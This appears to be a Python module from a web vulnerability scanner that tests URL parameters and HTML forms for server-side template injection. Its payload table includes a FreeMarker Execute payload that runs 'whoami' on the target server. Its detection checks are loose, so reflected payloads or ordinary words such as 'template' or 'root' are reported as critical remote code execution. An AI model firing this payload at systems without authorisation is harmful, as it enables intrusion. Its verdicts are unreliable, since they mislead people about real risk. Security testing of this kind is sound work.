"""
Server-Side Template Injection (SSTI) vulnerability scanner module.
"""
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs
from utils import log_message, display_task_start, display_task_complete
from utils.http_client import HTTPClient
import time

def run(target: str, options: Dict[str, Any], ctx) -> List[Dict[str, Any]]:
    """
    Test for SSTI vulnerabilities in URL parameters.
    
    Args:
        target: Target URL to test
        options: Scan configuration options
        ctx: Scan context object
    
    Returns:
        List of vulnerability findings
    """
    findings = []
    
    # Test URL parameters for SSTI
    findings.extend(test_ssti_url(target, options, ctx))
    
    return findings


def test_ssti_url(url: str, options: Dict[str, Any], ctx) -> List[Dict[str, Any]]:
    """Test URL parameters for SSTI vulnerabilities with detailed evidence."""
    display_task_start("URL SSTI Testing")
    findings = []
    
    parsed = urlparse(url)
    if not parsed.query:
        return findings
        
    ssti_payloads = {
        'java': {'payload': '${7*7}', 'result': '49', 'description': 'Java Expression Language injection'},
        'freemarker': {'payload': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}', 'result': 'whoami', 'description': 'FreeMarker template execution'},
        'python': {'payload': '{{7*7}}', 'result': '49', 'description': 'Jinja2/Twig template injection'},
        'twig': {'payload': '{{7*7}}', 'result': '49', 'description': 'Twig template injection'},
        'ruby': {'payload': '<%= 7*7 %>', 'result': '49', 'description': 'ERB template injection'},
        'javascript': {'payload': '<%= 7*7 %>', 'result': '49', 'description': 'EJS template injection'}
    }
    
    params = parse_qs(parsed.query)
    client = HTTPClient(timeout=options.get('timeout', 30))
    
    for param_name in params.keys():
        for engine, test_case in ssti_payloads.items():
            payload = test_case["payload"]
            expected_result = test_case["result"]
            test_params = params.copy()
            test_params[param_name] = payload
            new_query = "&".join([f"{k}={v}" for k, v in test_params.items()])
            test_url = url.replace(parsed.query, new_query)
            
            try:
                response = client.get(test_url)
                
                evidence_found = None
                impact_description = ""
                detection_method = ""
                
                # Mathematical expression evaluation
                if (expected_result in response.text and payload not in response.text):
                    evidence_found = f"SSTI payload executed template expression"
                    impact_description = f"{engine} template engine vulnerable to injection"
                    detection_method = "expression evaluation"
                
                # Command execution indicators
                elif ('whoami' in response.text or 'root' in response.text or 'administrator' in response.text):
                    evidence_found = f"SSTI payload executed system commands"
                    impact_description = f"{engine} template engine allows code execution"
                    detection_method = "command execution"
                
                # Template syntax errors
                elif any(error in response.text for error in ['template', 'syntax', 'parse error', 'compilation error']):
                    evidence_found = f"SSTI payload caused template processing errors"
                    impact_description = f"Template engine detected with error feedback"
                    detection_method = "error reflection"
                
                if evidence_found:
                    finding = {
                        "type": "Server-Side Template Injection Vulnerability",
                        "severity": "Critical",
                        "url": test_url,
                        "evidence": f"{evidence_found} in parameter '{param_name}'. {test_case['description']}. {impact_description} via {detection_method}.",
                        "description": "The application is vulnerable to Server-Side Template Injection attacks, allowing remote code execution on the server through template engine manipulation.",
                        "remediation": "Sanitize user input and avoid using user input in template rendering. Use logic-less templates when possible. Implement strict sandboxing for template engines. Apply principle of least privilege to template execution.",
                        "request_data": f"GET {test_url}",
                        "response_preview": f"Status: {response.status_code} | Template engine: {engine} | Exploitation: {evidence_found is not None}",
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                    }
                    findings.append(finding)
                    ctx.record_vulnerability(finding)
                    break
                    
            except Exception as e:
                log_message(f"Error testing SSTI on URL {url}: {e}")
    
    display_task_complete("URL SSTI Testing")
    return findings


def test_ssti_form(form: Dict[str, Any], page_url: str, options: Dict[str, Any], ctx) -> List[Dict[str, Any]]:
    """Test forms for SSTI vulnerabilities with detailed evidence."""
    findings = []
    
    if not ctx.is_same_domain(form['action']):
        return findings
        
    display_task_start("SSTI Testing")
    
    ssti_payloads = {
        'java': {'payload': '${7*7}', 'result': '49', 'description': 'Java Expression Language injection'},
        'freemarker': {'payload': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}', 'result': 'whoami', 'description': 'FreeMarker template execution'},
        'python': {'payload': '{{7*7}}', 'result': '49', 'description': 'Jinja2/Twig template injection'},
        'twig': {'payload': '{{7*7}}', 'result': '49', 'description': 'Twig template injection'},
        'ruby': {'payload': '<%= 7*7 %>', 'result': '49', 'description': 'ERB template injection'},
        'javascript': {'payload': '<%= 7*7 %>', 'result': '49', 'description': 'EJS template injection'}
    }
    
    client = HTTPClient(timeout=options.get('timeout', 30))
    
    for engine, test_case in ssti_payloads.items():
        payload = test_case["payload"]
        expected_result = test_case["result"]
        data = {}
        for input_field in form['inputs']:
            if input_field['type'] in ['text', 'textarea']:
                data[input_field['name']] = payload
            else:
                data[input_field['name']] = input_field['value']

        try:
            if form['method'] == 'post':
                response = client.post(form['action'], data=data)
            else:
                response = client.get(form['action'], params=data)

            evidence_found = None
            impact_description = ""
            
            # Check for evidence of template evaluation
            if (expected_result in response.text and payload not in response.text):
                evidence_found = f"SSTI payload executed template expression"
                impact_description = f"{engine} template engine vulnerable to injection"
            
            # Command execution evidence
            elif 'whoami' in response.text:
                evidence_found = f"SSTI payload executed system commands"
                impact_description = f"{engine} template engine allows remote code execution"
            
            if evidence_found:
                finding = {
                    "type": "Server-Side Template Injection Vulnerability",
                    "severity": "Critical",
                    "url": form['action'],
                    "evidence": f"{evidence_found} in form submission. {test_case['description']}. {impact_description}.",
                    "description": "The application is vulnerable to Server-Side Template Injection attacks via form parameters, allowing remote code execution through template engine manipulation.",
                    "remediation": "Sanitize user input and avoid using user input in template rendering. Implement strict input validation. Use logic-less templates or secure template configurations.",
                    "request_data": f"{form['method'].upper()} {form['action']} with SSTI payload: {payload}",
                    "response_preview": f"Status: {response.status_code} | Template engine: {engine} | Code execution: {evidence_found is not None}",
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                }
                findings.append(finding)
                ctx.record_vulnerability(finding)
                break
                
        except Exception as e:
            log_message(f"Error testing SSTI on {form['action']}: {e}")
    
    display_task_complete("SSTI Testing")
    return findings